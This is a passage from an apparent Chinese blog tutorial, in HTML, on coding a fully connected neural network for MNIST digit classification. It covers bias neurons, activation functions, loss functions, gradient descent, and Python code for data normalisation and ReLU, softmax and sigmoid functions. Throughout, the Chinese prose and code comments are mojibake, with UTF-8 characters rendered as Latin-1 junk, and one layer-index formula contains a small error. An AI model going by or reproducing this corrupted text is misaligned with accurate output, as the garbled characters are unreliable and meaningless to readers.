#2</code>ä¸­çš„ç¬¬0ä¸ªç¥ç»å…ƒï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè®°ä½œ<code>Z[2][0]</code>ï¼Œå…¶ä¸­ï¼Œ<code>Z</code>è¡¨ç¤ºç¥ç»å…ƒå‡½æ•°æœ¬èº«ï¼Œ<code>[2]</code>è¡¨ç¤ºå…¶åœ¨ç¬¬äºŒå±‚ï¼Œ<code>[0]</code>è¡¨ç¤ºå…¶æ˜¯ç¬¬ä¸€ä¸ªç¥ç»å…ƒï¼Œç”±å›¾å¯çŸ¥ï¼Œå®ƒçš„è¾“å…¥æ˜¯å…¶ä¸Šä¸€å±‚çš„æ‰€æœ‰ç¥ç»å…ƒçš„è¾“å‡ºï¼Œå®ƒçš„è¾“å‡ºä¼šä¼ é€’åˆ°ä¸‹ä¸€å±‚çš„æ¯ä¸€ä¸ªç¥ç»å…ƒï¼Œè¿™ä¹Ÿæ˜¯â€œå…¨è¿æ¥â€çš„ç›´æ¥ä½“ç°ï¼ˆä½ è¦æ˜¯çœ‹åˆ°å›¾é‡Œé¢ä»–æ²¡æœ‰å…¨è¿æ¥èµ·æ¥ï¼Œé‚£å¤šåŠæ˜¯æˆ‘æŠ å›¾çš„æ—¶å€™é­”æ£’ä¸å°å¿ƒæ‰£æ²¡äº†ï¼‰</p><p>è€Œç¥ç»å…ƒä¹‹é—´çš„ä¿¡å·ä¼ é€’å…¶å®æ˜¯ä¸€ä¸ªçº¿æ€§çš„è¿‡ç¨‹ï¼Œç±»æ¯”<code>y=kx+b</code>ï¼Œå³</p><center><code>Z[2][0]=âˆ‘w[2][i][0]*Z[1][i], i for i in range(0,6)</code></center><br><center><b>WARNING: è¿™ä¸ªå¼å­æ˜¯é”™çš„ï¼Œä½†æš‚æ—¶å…ˆè¿™æ ·ç†è§£</b></center><br><p>åœ¨<code>w[2][i][0]</code>ä¸­ï¼Œ<code>w</code>è¡¨ç¤ºæƒé‡ï¼ˆç±»æ¯”kï¼Œå…·ä½“ç‚¹ï¼Œå¯ä»¥æŠŠwç›¸æˆæ˜¯ç¥ç»å…ƒä¹‹é—´è¿æ¥çš„çº¿ï¼‰ï¼Œ<code>[2]</code>è¡¨ç¤ºè¯¥æƒé‡æ˜¯ç¬¬ä¸€å±‚ä¸ç¬¬äºŒå±‚ä¹‹é—´çš„ï¼Œ<code>[i]</code>è¡¨ç¤ºä¸Šä¸€å±‚ä¸­çš„ç¬¬iä¸ªï¼Œ<code>[0]</code>è¡¨ç¤ºä¸‹ä¸€å±‚ä¸­çš„ç¬¬0ä¸ªï¼ˆè¡¨è¾¾ä¸Šæœ‰ç‚¹ç¹çï¼Œä½†å¹¶ä¸éš¾ç†è§£ï¼‰</p><h3 id="åç½®"><a href="#åç½®" class="headerlink" title="åç½®"></a>åç½®</h3><p>æ˜¾ç„¶ç›¸å¯¹äº<code>y=kx+b</code>ï¼Œè¿˜å°‘äº†å…¶ä¸­çš„<code>b</code>ï¼Œä¸ºäº†è¡¥ä¸Š<code>b</code>ï¼Œåœ¨FCNNä¸­ï¼Œä¼šç»™é™¤äº†è¾“å‡ºå±‚ä¹‹å¤–çš„æ¯ä¸€å±‚è¡¥ä¸Šä¸€ä¸ªç¥ç»å…ƒä½œä¸º<code>bias</code>ï¼Œåˆç§°åç½®ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç¥ç»å…ƒï¼Œå…¶ä¸æ¥å—ä»»ä½•è¾“å…¥ï¼Œç„¶åå¯¹ä¸‹ä¸€å±‚ä¸­çš„æ¯ä¸€ä¸ªç¥ç»å…ƒéƒ½ç¨³å®šè¾“å‡ºä¸€ä¸ª<code>+1</code>ï¼Œç„¶åä¸‹ä¸€å±‚ä¸­åç½®å¯¹æ¯ä¸ªç¥ç»å…ƒå½±å“çš„å¤§å°å†ç”±å¯¹åº”çš„æƒé‡æ¥è°ƒæ•´ï¼Œå…·ä½“çš„è¿æ¥æ–¹å¼å¦‚å›¾ç™½è‰²éƒ¨åˆ†æ‰€ç¤º</p><img src="/images/FCNN_bias.png"/><p>ç°åœ¨å¯ä»¥è¯•ç€ä¸¾ä¸€ä¸ªä¾‹å­äº†ï¼Œæ¯”å¦‚è€ƒè™‘å¦‚ä¸‹æƒ…å†µ<code>?</code>çš„å€¼</p><img src="/images/FCNN_neuronExample.png"/><p>è€Œé—®å·çš„ä¸‹é¢é‚£ä¸ªç¥ç»å…ƒçš„å€¼ï¼Œæ˜¯<code>-0.3+0.05+(-0.12)+(-0.4)=-0.77</code></p><h3 id="æ¿€æ´»å‡½æ•°"><a href="#æ¿€æ´»å‡½æ•°" class="headerlink" title="æ¿€æ´»å‡½æ•°"></a>æ¿€æ´»å‡½æ•°</h3><p>å¦‚æœç›´æ¥æŠŠçº¿æ€§è®¡ç®—å¾—åˆ°çš„<code>Z</code>ä½œä¸ºè¯¥ç¥ç»å…ƒçš„è¾“å‡ºä¼ é€’åˆ°ä¸‹ä¸€å±‚ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç½‘ç»œä¹Ÿå°†æ˜¯ä¸€ä¸ªçº¿æ€§ç½‘ç»œï¼Œè¿™æ ·çš„ç½‘ç»œä¸ç®¡æ˜¯åå±‚è¿˜æ˜¯ç™¾å±‚éƒ½åªèƒ½ç›¸å½“äºä¸€å±‚</p><p>ä¸ºäº†å¾—åˆ°ä¸€ä¸ªéçº¿æ€§çš„ç½‘ç»œï¼Œåœ¨é™¤äº†è¾“å…¥å±‚ä¹‹å¤–çš„æ¯ä¸€å±‚éƒ½ä¼šåœ¨<code>Z</code>çš„åŸºç¡€ä¸Šå†å¥—ä¸€ä¸ªæ¿€æ´»å‡½æ•°<code>A</code>ï¼Œæ¿€æ´»å‡½æ•°ä»¥<code>Z</code>ä½œä¸ºè¾“å…¥ï¼Œå³ç¥ç»å…ƒçš„è¾“å‡ºå…¶å®æ˜¯<code>A(Z)</code></p><p>å¸¸è§çš„æ¿€æ´»å‡½æ•°æœ‰ï¼š<code>ReLU</code>ï¼Œ<code>tanh</code>ï¼Œ<code>sigmoid</code>ç­‰ï¼Œå°±ä¸é™„å›¾äº†æœä¸€ä¸‹å°±æœ‰ï¼ˆæ‡’</p><p>é‚£ä¹ˆï¼Œæ›´æ–°ä¸€ä»¥ä¸‹ä¹‹å‰æåˆ°çš„<code>Z</code>çš„å¼å­ï¼Œåº”è¯¥æ˜¯</p><center><code>Z[2][0]=âˆ‘w[2][i][0]*A[2][i], i for i in range(0,6)</code></center><br><p>ï¼ˆç”±äºåç½®ä½œä¸ºä¸€ä¸ªç¥ç»å…ƒåŒ…å«è¿›ä¸Šä¸€å±‚çš„è¾“å‡ºï¼Œå°±ä¸åœ¨å¼å­ä¸­å•ç‹¬åŠ ä¸Šä¸€ä¸ª<code>b</code>äº†ï¼‰</p><p>å¯¹äºè¾“å‡ºå±‚ï¼Œæ¿€æ´»å‡½æ•°åˆ™è¦æ ¹æ®å…·ä½“é—®é¢˜æ¥é€‰æ‹©ï¼Œä¾‹å¦‚MNISTæ‰‹å†™æ•°å­—é›†æ˜¯åˆ†ç±»0è‡³9çš„æ•°å­—ï¼Œæœ‰å¤šä¸ªç±»åˆ«ï¼Œåˆ™ä¼šé€‰ç”¨<code>softMax</code>ä½œä¸ºè¾“å‡ºçš„æ¿€æ´»å‡½æ•°ï¼Œå…¶ç‰¹å¾æ˜¯ç´¯åŠ ä¹‹å’Œä¸º1ï¼Œè¿™ç¬¦åˆå¤šåˆ†ç±»çš„é—®é¢˜çš„æœŸæœ›è§£ï¼Œæ›´å…·ä½“çš„ä¸œè¥¿ï¼Œæ¯”å¦‚<code>softMax</code>çš„æ±‚åå¯¼ï¼Œå…·ä½“å…¬å¼ä¹‹ç±»çš„ï¼Œå°±ä¸èµ˜è¿°äº†ï¼ˆæ‡’</p><h3 id="æµç¨‹æ¢³ç†"><a href="#æµç¨‹æ¢³ç†" class="headerlink" title="æµç¨‹æ¢³ç†"></a>æµç¨‹æ¢³ç†</h3><p>ä»¥ä¸‹æ¢³ç†ä¸€ä¸‹æ•°æ®ä¼ é€’çš„æ•´ä½“æµç¨‹</p><ul><li>è¾“å…¥çš„æ•°æ®ä¸º<code>X</code>ï¼ˆè¾“å…¥å±‚ï¼‰ï¼Œç›´æ¥è¾“å…¥åˆ°éšè—å±‚</li><li>éšè—å±‚ç¬¬ä¸€å±‚çš„è¾“å‡ºä¸º<code>A1(Z1)</code>ï¼Œå…¶ä¸­<code>Z1=w1*X</code></li><li>éšè—å±‚ç¬¬äºŒå±‚çš„è¾“å‡ºä¸º<code>A2(Z2)</code>ï¼Œå…¶ä¸­<code>Z2=w2*A1</code></li><li>â€¦â€¦ä»¥æ­¤ç±»æ¨</li></ul><h2 id="è®­ç»ƒè¿‡ç¨‹"><a href="#è®­ç»ƒè¿‡ç¨‹" class="headerlink" title="è®­ç»ƒè¿‡ç¨‹"></a>è®­ç»ƒè¿‡ç¨‹</h2><p>ä¸»è¦å°±æ˜¯æ¢¯åº¦ä¸‹é™ï¼Œä¸€å¥è¯ï¼Œæ±‚æ¢¯åº¦ï¼Œç„¶åå¾€è´Ÿæ¢¯åº¦çš„æ–¹å‘è¡Œè¿›ï¼Œå¯ä»¥æ±‚å¾—ä¸€ä¸ªå‡½æ•°çš„æå°å€¼ï¼Œä½†æ˜¯ï¼šä¸ºä»€ä¹ˆæ¢¯åº¦ä¸‹é™è¿™ä¸ªæ–¹æ³•å¯ä»¥è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œå…·ä½“æ˜¯æ€ä¹ˆimplementçš„ï¼Œå¤§æ¦‚å°±åˆ°äº†å¤§å¤šæ•°äººçš„è®¤çŸ¥è¾¹ç•Œäº†/æ»‘ç¨½ã€‚è€ƒè™‘æ¢¯åº¦ä¸‹é™ä¹‹å‰ï¼Œå…ˆäº†è§£æ±‚æ¢¯åº¦çš„åº”ç”¨å¯¹è±¡ï¼šæŸå¤±å‡½æ•°</p><h3 id="æŸå¤±å‡½æ•°"><a href="#æŸå¤±å‡½æ•°" class="headerlink" title="æŸå¤±å‡½æ•°"></a>æŸå¤±å‡½æ•°</h3><p>loss/cost functionï¼Œè®°ä½œ<code>J</code>ï¼Œæ˜¯æè¿°æ¨¡å‹çš„é¢„æµ‹ç»“æœå¯¹äºçœŸå®å€¼çš„å·®å¼‚çš„å‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œç»™äº†æ¨¡å‹<code>1</code>çš„å›¾ç‰‡è¾“å…¥ï¼Œæ¨¡å‹çš„è¾“å‡ºå´æ˜¯<code>&#123;0.5,0.5,0,0,0,0,0,0,0,0&#125;</code>ï¼Œè¿™ä¸åº”è¯¥å‡ºç°çš„ç»“æœäº§ç”Ÿäº†åå·®ï¼Œè¦æè¿°è¿™ä¸ªåå·®ï¼Œå¯ä»¥ç›´æ¥æ±‚å®é™…è¾“å‡ºå‘é‡å’ŒæœŸæœ›çš„è¾“å‡ºå‘é‡ä¹‹å·®çš„L2èŒƒæ•°ï¼Œå³æ±‚ä»–ä»¬çš„å‡æ–¹è¯¯å·®ï¼Œè®°æœŸæœ›çš„å‘é‡ä¸º<code>y</code>ï¼Œå®é™…è¾“å‡ºçš„å‘é‡ä¸º<code>h(x)</code>ï¼Œåˆ™<code>J=âˆ‘((y-h(x))*(y-h(x)))</code>ï¼Œæ­¤å¤„ä¹˜ç§¯ä¸ºå¯¹åº”å…ƒç´ ç›¸ä¹˜ï¼Œåˆ™è®¡ç®—å¯å¾—losså¤§çº¦æ˜¯0.71</p><p>é€šè¿‡æŸå¤±å‡½æ•°ï¼Œå°±å¯ä»¥é‡åŒ–è¡¨ç¤ºæ¨¡å‹é¢„æµ‹ç»“æœçš„å‡†ç¡®åº¦äº†ï¼Œè€Œå¤§å¤šæ•°æ—¶å€™ä¼šä½¿ç”¨è¾ƒå¤æ‚åº¦æ›´é«˜çš„å¸¦<code>log</code>çš„äº¤å‰ç†µå‡½æ•°ä½œä¸ºæŸå¤±å‡½æ•°ï¼Œå…¬å¼å¦‚ä¸‹</p><img src="/images/FCNN_crossEntropy.png"/><p>çœ‹èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œä½†ç”»ä¸€ä¸ªæŠ›ç‰©çº¿æ¥è¡¨ç¤ºå‡æ–¹è¯¯å·®å‡½æ•°ï¼Œå†ç”»ä¸€ä¸‹logçš„å›¾åƒç†è§£äº¤å‰ç†µå‡½æ•°å°±å·®ä¸å¤šäº†</p><p>äº¤å‰ç†µå¥½å¤„éƒ½æœ‰å•¥ï¼šæ”¶æ•›å¿«ï¼Œå±€éƒ¨æœ€ä¼˜ç‚¹å°‘ï¼ŒçŸ¥é“å°±è¡Œ</p><h3 id="æ¢¯åº¦ä¸‹é™"><a href="#æ¢¯åº¦ä¸‹é™" class="headerlink" title="æ¢¯åº¦ä¸‹é™"></a>æ¢¯åº¦ä¸‹é™</h3><blockquote><p>é™¤äº†å•çº¯çš„æ¢¯åº¦ä¸‹é™ï¼Œè¿˜æœ‰å¦‚momentumï¼ŒRmsPropï¼ŒAdamç­‰ä¼˜åŒ–ç®—æ³•ï¼Œä½†æœ¬æ–‡ä½¿ç”¨<code>mini-batch</code>æ¢¯åº¦ä¸‹é™æ³•æ¥è®­ç»ƒ</p></blockquote><p>é¦–å…ˆæ˜ç¡®å¸¸é‡ï¼šè®­ç»ƒæ—¶ç”¨çš„æ ·æœ¬<code>X</code>æ˜¯å›ºå®šä¸å˜çš„ï¼Œæ ·æœ¬å¯¹åº”çš„<code>lable</code>ï¼Œæˆ–è®°ä½œ<code>y</code>ï¼Œä¹Ÿæ˜¯ä¸å˜çš„ï¼Œå”¯ä¸€å˜åŒ–çš„å°±åªæœ‰ç½‘ç»œä¸­é—´è¿æ¥å„ä¸ªå±‚çº§çš„æƒé‡<code>w</code>ï¼ˆåç½®<code>b</code>åŒ…å«åœ¨æƒé‡é‡Œè¾¹ï¼Œå› ä¸ºåç½®çš„å…·ä½“å¤§å°ç”±è¿æ¥çš„æƒé‡æ§åˆ¶ï¼‰ï¼Œä»¥åŠå› ä¸ºæƒé‡å˜åŒ–è€Œè·Ÿç€ä¸€èµ·å˜åŒ–çš„é¢„æµ‹ç»“æœï¼Œè¿˜æœ‰ä¸­é—´é‡<code>A</code>å’Œ<code>Z</code>ï¼Œä¸€åˆ‡å˜åŒ–éƒ½æ¥è‡ªäºæƒé‡<code>w</code>çš„å˜åŒ–</p><p>é—®é¢˜ç°åœ¨åˆ™åº”è¯¥ç†è§£æˆï¼šæ‰¾åˆ°åˆé€‚çš„<code>w</code>ï¼Œä½¿å¾—<code>J</code>æœ€å°</p><p>å…·ä½“ç‚¹ï¼Œå°±æ˜¯ï¼šå¯¹<code>J(w)</code>æ±‚å…³äº<code>w</code>çš„åå¯¼ï¼Œè·å–<code>J(w)</code>çš„æ¢¯åº¦ï¼Œç„¶åæ›´æ–°æƒé‡<code>w</code>ä¸º<code>w-=rate*dw</code>ï¼Œå…¶ä¸­ï¼Œ<code>dw</code>ä¸º<code>J(w)</code>çš„æ¢¯åº¦ï¼Œ<code>rate</code>ä¸ºå­¦ä¹ ç‡ï¼Œæ§åˆ¶äº†ä¸€æ¬¡ä¸‹é™å¤šå°‘ï¼Œå­¦ä¹ ç‡è¿‡ä½ä¼šå¯¼è‡´è®­ç»ƒç¼“æ…¢ï¼Œå­¦ä¹ ç‡è¿‡é«˜åˆ™å®¹æ˜“å„ç§<code>NAN</code>æˆ–è€…åå¤æ¨ªè·³æ— æ³•æ”¶æ•›ï¼Œéœ€è¦ä¸€å®šçš„è¯•é”™æˆæœ¬æ¥ç¡®å®šåˆé€‚çš„å­¦ä¹ ç‡ï¼Œä¸€èˆ¬åœ¨10e-6åˆ°1ä¹‹é—´</p><p>ç”±äºè¿™éƒ¨åˆ†å†…å®¹ç½‘ä¸Šèµ„æºæŒºå¤šçš„ï¼Œå°±ä¸èµ˜è¿°äº†ï¼ˆæ‡’</p><p>ï¼ˆåé¢ä¼šæœ‰åå‘ä¼ æ’­çš„æ¨å¯¼ï¼Œè¿™æ‰æ˜¯é‡ç‚¹</p><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><p>ä»¥ä¸Šå°±æ˜¯ä¸€äº›é‡è¦çš„å‰ç½®ï¼ˆå› ä¸ºæˆ‘æ€•æŠŠç†è§£å’Œä»£ç èä¸ºä¸€ä½“ä¼šå¯¼è‡´é€»è¾‘æ··ä¹±ï¼‰ï¼Œä»¥ä¸‹å†…å®¹å°±æ­£å¼å¼€å§‹æ¶‰åŠç ä»£ç äº†ï¼Œåå¥½æ‰¶ç¨³</p><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>åœ¨<code>kaggle</code>ä¸‹è½½åˆ°ä»–ä»¬æä¾›çš„MNISTæ‰‹å†™æ•°å­—æ•°æ®é›†åï¼Œä¸èƒ½ä¸Šæ‰‹å³ç”¨</p><ul><li>é¢œè‰²èŒƒå›´0è‡³255è¿™ä¸ªåŒºé—´å¤ªå¤§äº†ï¼Œåº”è¯¥å‹ç¼©åˆ°0è‡³1ï¼Œæ•´ä½“é™¤ä»¥255</li><li>å†è€…æ•°æ®çš„åˆ†å¸ƒä¹Ÿä¸è‡ªç„¶ï¼Œåº”è¯¥å¥—ä¸€ä¸ªæ ‡å‡†åˆ†æ•°å…¬å¼ï¼Œå¤„ç†æˆæ­£æ€åˆ†å¸ƒ</li></ul><p>å…³äºåº”è¯¥å¯¹å•ä¸ªåƒç´ åšå¤„ç†è¿˜æ˜¯å¯¹æ•´ä½“åšå¤„ç†ï¼ˆä¾‹å¦‚æ±‚å‡å€¼ï¼Œæ˜¯å¯¹æ¯ä¸€ä¸ªåƒç´ æ±‚å‡ºå¯¹åº”åƒç´ ä½ç½®çš„å‡å€¼ï¼Œè¿˜æ˜¯æ•´ä½“å¤„ç†ï¼Œç›´æ¥æ±‚å‡ºæ‰€æœ‰åƒç´ çš„å‡å€¼ï¼‰ï¼Œåœ¨æœ¬ä¾‹ä¸­åº”è¯¥æ•´ä½“å¤„ç†æ›´å¥½</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤„ç†æ•°æ®é›†</span></span><br><span class="line">dsTrain = pd.read_csv(<span class="string">r&#x27;mnist.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># åŸæœ¬kaggleä¸Šçš„æµ‹è¯•é›†æ˜¯æ²¡æœ‰lableåˆ†ç±»çš„ï¼Œåœ¨kaggleçš„leaderBoardä¸Šæ‰¾åˆ°æ­£ç¡®çš„lableåpd.concatåˆ°åŸæœ¬çš„æµ‹è¯•é›†</span></span><br><span class="line">dsTest = pd.read_csv(<span class="string">r&#x27;mnist_test.csv&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># è·å–è®­ç»ƒé›†çš„ç‰¹å¾</span></span><br><span class="line"><span class="string">ds_std = np.std(dsTrain.iloc[:, 1:], axis = 0) # è®­ç»ƒé›†æ ‡å‡†å·®</span></span><br><span class="line"><span class="string">ds_mean = np.mean(dsTrain.iloc[:, 1:], axis = 0) # è®­ç»ƒé›†å‡å€¼</span></span><br><span class="line"><span class="string"># æ ‡å‡†åŒ–æ•°æ®ï¼Œæ­¤æ–¹æ³•æ˜¯é’ˆå¯¹è®­ç»ƒé›†ä¸­çš„åŒä¸€ä½ç½®çš„åƒç´ ï¼Œæ•ˆæœä¸€èˆ¬ï¼Œæ•…æœªé‡‡ç”¨</span></span><br><span class="line"><span class="string">for i in range(len(ds.T) - 1):</span></span><br><span class="line"><span class="string">    if ds_std[i] != 0: # è¾¹è§’ä¸Šå°±å¾ˆå¯èƒ½å‡ºç°æ ‡å‡†å·®ä¸º0çš„åƒç´ </span></span><br><span class="line"><span class="string">        dsR.iloc[:, i + 1] = (dsR.iloc[:, i + 1] - ds_mean[i]) / ds_std[i] # æ ‡å‡†åˆ†æ•°å…¬å¼ï¼ŒåŸºæœ¬å‘ˆæ­£æ€åˆ†å¸ƒ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">trainX = dsTrain.iloc[:, <span class="number">1</span>:]</span><br><span class="line">trainy = dsTrain.iloc[:, :<span class="number">1</span>]</span><br><span class="line"><span class="comment"># æ’åˆ—æµ‹è¯•é›†ï¼Œæ–¹ä¾¿åœ¨æµ‹è¯•ä¹‹åç»˜å›¾</span></span><br><span class="line">testX = pd.concat([dsTest[dsTest[<span class="string">&quot;label&quot;</span>] == i].iloc[:, <span class="number">1</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line">testy = pd.concat([dsTest[dsTest[<span class="string">&quot;label&quot;</span>] == i].iloc[:, :<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line"><span class="comment"># å½’ä¸€åŒ–</span></span><br><span class="line">trainX = trainX / <span class="number">255</span></span><br><span class="line">testX = testX / <span class="number">255</span></span><br><span class="line"><span class="comment"># è·å–è®­ç»ƒé›†ç‰¹å¾</span></span><br><span class="line">mean = np.mean(np.array(trainX).ravel())  <span class="comment"># è®­ç»ƒé›†å‡å€¼</span></span><br><span class="line">std = np.std(np.array(trainX).ravel())  <span class="comment"># è®­ç»ƒé›†æ ‡å‡†å·®</span></span><br><span class="line">trainX = (trainX - mean) / std  <span class="comment"># æ ‡å‡†åˆ†æ•°å…¬å¼ï¼ŒåŸºæœ¬å‘ˆæ­£æ€åˆ†å¸ƒ</span></span><br><span class="line">testX = (testX - mean) / std  <span class="comment"># ç”¨è®­ç»ƒé›†çš„ç‰¹å¾å¤„ç†æµ‹è¯•é›†æ•°æ®ï¼Œæ‰èƒ½è¯æ˜æ¨¡å‹æ˜¯å¦èƒ½è¯†åˆ«é™Œç”Ÿæ•°æ®</span></span><br></pre></td></tr></table></figure>    </div></div><h3 id="æ•°å­¦å‡½æ•°"><a href="#æ•°å­¦å‡½æ•°" class="headerlink" title="æ•°å­¦å‡½æ•°"></a>æ•°å­¦å‡½æ•°</h3><p>ä¹‹å‰æåˆ°äº†ä¸€å †æ•°å­¦å‡½æ•°ï¼Œå®ç°èµ·æ¥ä¸»è¦å°±æ˜¯<code>softMax</code>å’Œ<code>sigmoid</code>ä¼šæ¯”è¾ƒè€½è¯¯æ—¶é—´</p><p><code>leaky ReLU</code>æ˜¯<code>ReLU</code>çš„å®éªŒæ€§å˜ç§ï¼Œé€šå¸¸ç”¨äºåœ¨å®éªŒçš„æ—¶å€™é¿å…å› ä¸ºä½¿ç”¨<code>ReLU</code>å¯¼è‡´å¤§é‡ç¥ç»å…ƒæ­»äº¡ï¼Œæ¢¯åº¦æ¶ˆå¤±çš„é—®é¢˜</p><blockquote><p>åè®°ï¼šä¹‹å‰çš„SoftMaxåå¯¼æ±‚é”™äº†ï¼Œå…¶åº”è¯¥æ˜¯ä¸€ä¸ªæ–¹é˜µï¼Œä½†ä¼°è®¡æ˜¯å› ä¸ºä¸€å¼€å§‹å†™çš„æ—¶å€™ä¸ºäº†æ–¹ä¾¿ï¼Œæ²¡æœ‰ç†è§£æ¸…æ¥šå°±å»æ‰¾äº†ä¸€æ®µæ ‡ç§°æ˜¯derivative of softmaxçš„ä»£ç ï¼Œç»“æœä»–æ±‚çš„åªæ˜¯åœ¨<code>i=j</code>æƒ…å†µä¸‹çš„çš„softmax<br>è™½ç„¶äº‹åè¯æ˜è¿™ä¸€è°¬è¯¯åªå½±å“äº†æˆ‘ä¸€ä¸ªç™¾åˆ†ç‚¹çš„æ­£ç¡®ç‡ï¼Œä½†ç»™æˆ‘åæ¥å¤ç”¨è¿™æ®µä»£ç æ¥æ‰¾å¯¹äºè¾“å…¥å‘é‡çš„æ¢¯åº¦ï¼Œå¹¶ç”¨è‡ªå·±æ‰¾åˆ°çš„æ¢¯åº¦å’Œ<code>tensorflow</code>ä¸­<code>gradientTape</code>æ±‚å¾—çš„æ¢¯åº¦æ¯”è¾ƒæ—¶æ€€ç–‘äººç”Ÿ</p></blockquote><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># d_func æ˜¯funcçš„å¯¼æ•°/åå¯¼ derivative</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">relu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_relu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lrelu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># leaky relu</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0.1</span> * x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_lrelu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (x &gt; <span class="number">0</span>) * <span class="number">0.9</span> + <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">softMax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.array(np.exp(x) / np.<span class="built_in">sum</span>(np.exp(x), axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_softMax</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = softMax(x)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">            r.append([])</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">                r[-<span class="number">1</span>].append(-x[i][j] * x[i][k] <span class="keyword">if</span> j != k <span class="keyword">else</span> x[i][j] * (<span class="number">1</span> - x[i][k]))</span><br><span class="line">    <span class="keyword">return</span> np.array(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    x_ravel = np.array(x).ravel()</span><br><span class="line">    length = <span class="built_in">len</span>(x_ravel)</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> x_ravel[i] &gt;= <span class="number">0</span>:</span><br><span class="line">            x_ravel[i] = <span class="built_in">min</span>(<span class="number">19</span>, x_ravel[i])  <span class="comment"># é™åˆ¶èŒƒå›´ï¼Œç²¾åº¦ä¸å¤Ÿï¼Œnp.exp()ä¹Ÿæ˜“çˆ†</span></span><br><span class="line">            y.append(<span class="number">1.0</span> / (<span class="number">1</span> + np.exp(-x_ravel[i])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x_ravel[i] = <span class="built_in">max</span>(-<span class="number">744</span>, x_ravel[i])</span><br><span class="line">            y.append(np.exp(x_ravel[i]) / (np.exp(x_ravel[i]) + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> np.array(y).reshape(x.shape)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sigmoid(x) * (<span class="number">1</span> - 